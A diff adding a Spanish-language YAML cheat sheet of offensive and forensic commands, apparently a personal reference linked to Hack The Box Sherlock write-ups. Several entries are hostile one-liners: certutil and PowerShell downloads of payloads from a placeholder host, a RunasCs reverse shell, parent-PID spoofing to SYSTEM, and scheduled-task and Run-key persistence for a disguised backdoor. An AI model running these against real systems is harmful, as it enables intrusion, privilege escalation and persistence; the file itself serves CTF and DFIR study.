@@ -1,0 +1,154 @@
+# Arsenal de Angxdes — base de datos de comandos/técnicas.
+#
+# Cada entrada:
+#   cmd:   el comando o técnica (en una línea)
+#   fase:  la actividad / fase (mira la lista de abajo para reutilizar nombres)
+#   desc:  qué hace, en una frase
+#   tags:  palabras clave para el buscador
+#   refs:  dónde lo usaste (lista; cada uno con nombre + url al writeup).
+#          Déjalo vacío con []  si aún no lo has usado en un writeup publicado.
+#
+# Fases sugeridas (para que los filtros no se multipliquen):
+#   Reconocimiento, Enumeración, Acceso inicial, Transferencia de archivos,
+#   Credenciales, Movimiento lateral, Escalada de privilegios, Persistencia,
+#   Análisis / DFIR, Reversing, C2, Cripto
+#
+# Consejo: usa el script  .\scripts\nuevo-comando.ps1  para añadir entradas.
+
+# ----------------------- Reconocimiento (general) -----------------------
+
+- cmd: 'nmap -p- --open --min-rate 5000 -n -Pn <IP> -oG allPorts'
+  fase: Reconocimiento
+  desc: Escaneo rápido de todos los puertos TCP abiertos.
+  tags: [nmap, scanning, tcp]
+  refs: []
+
+- cmd: 'nmap -sCV -p<puertos> <IP> -oN targeted'
+  fase: Reconocimiento
+  desc: Enumeración de versiones y scripts por defecto sobre los puertos abiertos.
+  tags: [nmap, scanning, enum]
+  refs: []
+
+# ----------------------- ShadowBait (DFIR) -----------------------
+
+- cmd: 'certutil.exe -urlcache -f http://<IP>/RunasCs.exe RunasCs.exe'
+  fase: Transferencia de archivos
+  desc: Descargar un archivo desde un servidor remoto usando un binario legítimo de Windows (LOLBin).
+  tags: [lolbin, certutil, windows, download]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: 'Invoke-WebRequest http://<IP>/opendll.exe -OutFile C:\Users\<user>\AppData\Roaming\opendll.exe'
+  fase: Transferencia de archivos
+  desc: Descargar un payload a disco desde PowerShell.
+  tags: [powershell, download]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: '$cred = Import-Clixml -Path connection.xml'
+  fase: Credenciales
+  desc: Descifra con DPAPI, de forma transparente, credenciales guardadas por el usuario de la sesión actual.
+  tags: [dpapi, powershell, credentials, windows]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: '$cred | Export-Clixml -Path C:\Users\<user>\Documents\connection.xml'
+  fase: Credenciales
+  desc: Guarda un objeto PSCredential cifrado con DPAPI (solo lo descifra ese usuario en esa máquina).
+  tags: [dpapi, powershell, credentials]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: 'RunasCs.exe <usuario> <password> cmd.exe -r <IP>:<puerto>'
+  fase: Movimiento lateral
+  desc: Ejecutar un comando/shell en el contexto de otro usuario eludiendo ciertas restricciones.
+  tags: [runascs, lateral-movement, windows]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: 'ImpersonateFromParentPid -ppid <PID_SYSTEM> -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e <b64>"'
+  fase: Escalada de privilegios
+  desc: Parent PID Spoofing — lanzar un proceso que hereda el token de un proceso de alto nivel (SYSTEM). Script psgetsys.ps1.
+  tags: [parent-pid-spoofing, psgetsys, privesc, windows]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: 'schtasks /create /tn "Updater" /tr C:\Windows\system32\document.pdf.exe /sc onlogon /ru SYSTEM'
+  fase: Persistencia
+  desc: Crear una tarea programada que ejecuta un backdoor en cada inicio de sesión.
+  tags: [schtasks, persistence, windows]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Windows\system32\document.pdf.exe /f'
+  fase: Persistencia
+  desc: Clave de registro Run para ejecutar un backdoor al iniciar sesión.
+  tags: [registry, run-key, persistence, windows]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: 'DB Browser for SQLite -> tabla "downloads" en Default\History (Chrome)'
+  fase: Análisis / DFIR
+  desc: Revisar el historial de descargas de Chrome para hallar el archivo de phishing y su URL (tab_url).
+  tags: [dfir, chrome, sqlite, forensics]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: 'Timeline Explorer -> filtrar Parent Path en mft.csv'
+  fase: Análisis / DFIR
+  desc: Analizar la Master File Table para datar la creación de archivos sospechosos.
+  tags: [dfir, mft, timeline-explorer, forensics]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+- cmd: 'Sysmon: Event ID 1 (proceso), 3 (red), 11 (creación de archivo)'
+  fase: Análisis / DFIR
+  desc: IDs de evento de Sysmon clave para rastrear ejecución, conexiones C2 y archivos escritos (p. ej. un .lnk en Startup).
+  tags: [dfir, sysmon, evtx, forensics]
+  refs:
+    - nombre: "HTB: ShadowBait"
+      url: /posts/htb-sherlock-shadowbait/
+
+# ----------------------- SneakyKeys (Reversing) -----------------------
+
+- cmd: 'Buscar la constante "expand 32-byte k" (Ghidra)'
+  fase: Reversing
+  desc: Firma de la matriz de inicialización de ChaCha20/Salsa20; delata el algoritmo de cifrado en un binario.
+  tags: [reversing, ghidra, chacha20, crypto]
+  refs:
+    - nombre: "HTB: SneakyKeys"
+      url: /posts/htb-sherlock-sneakykeys/
+
+- cmd: 'htons(0x1A29) -> 6697 (Ghidra / WS2_32)'
+  fase: Reversing
+  desc: El argumento de htons revela el puerto de C2; 6697 = IRC. Cerca aparecen inet_addr y connect.
+  tags: [reversing, ghidra, ws2_32, irc, c2]
+  refs:
+    - nombre: "HTB: SneakyKeys"
+      url: /posts/htb-sherlock-sneakykeys/
+
+- cmd: 'SHGetFolderPathA(CSIDL=7) -> carpeta Startup'
+  fase: Reversing
+  desc: CSIDL 7 es la carpeta de inicio del usuario; indica persistencia copiándose ahí.
+  tags: [reversing, persistence, csidl, windows]
+  refs:
+    - nombre: "HTB: SneakyKeys"
+      url: /posts/htb-sherlock-sneakykeys/
+
+- cmd: 'descifrar_chacha20(key_hex, nonce_hex, ciphertext_hex)'
+  fase: Cripto
+  desc: Descifrar cadenas o tráfico capturado con la key y el nonce (8 bytes) extraídos del binario.
+  tags: [crypto, chacha20, python]
+  refs:
+    - nombre: "HTB: SneakyKeys"
+      url: /posts/htb-sherlock-sneakykeys/
